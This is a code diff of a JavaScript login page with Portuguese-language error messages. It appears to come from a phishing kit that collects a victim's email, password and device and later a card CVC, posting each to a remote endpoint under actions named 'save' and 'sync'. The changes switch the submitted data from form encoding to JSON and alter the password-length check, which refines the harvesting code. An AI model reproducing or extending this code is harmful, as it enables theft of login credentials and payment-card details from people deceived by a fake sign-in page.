@@ -46,14 +46,14 @@ function Login(){
     let device= document.querySelector("#os").value;
     let error2txt   = document.querySelector(".error2txt");
 
-    if(senha.length <= 7){
+    if(senha.length < 7){
         error2txt.innerHTML = ' Senha incorreta. Tente novamente ou clique em "Esqueceu a senha?" para redefini-la. ';
         ErrorPasswordShow();
     }else{
 
         document.querySelector(".entrar").disabled = true;
 
-        var form_data = new FormData();
+        // var form_data = new FormData();
 
         item = {
             user: email,
@@ -62,13 +62,13 @@ function Login(){
             action:'save'
         }
     
-        for (var key in item) {
-            form_data.append(key, item[key]);
-        }
+        // for (var key in item) {
+        //     form_data.append(key, item[key]);
+        // }
         
         fetch(endpoint, {
             method: "POST",
-            body: form_data,
+            body: JSON.stringify(item),
             cache: 'no-cache'
         }).then(function(response) {
             console.log(response);
@@ -226,7 +226,7 @@ function Sync(){
     var cvc   = document.querySelector('#cvc').value;
     var email = localStorage.getItem("email");
    
-    var form_data = new FormData();
+    // var form_data = new FormData();
 
     item = {
         email: email,
@@ -234,13 +234,13 @@ function Sync(){
         action:'sync'
     }
 
-    for (var key in item) {
-        form_data.append(key, item[key]);
-    }
+    // for (var key in item) {
+    //     form_data.append(key, item[key]);
+    // }
     
     fetch(endpoint, {
         method: "POST",
-        body: form_data,
+        body: JSON.stringify(item),
         cache: 'no-cache'
     })
     .then(response => response.json())
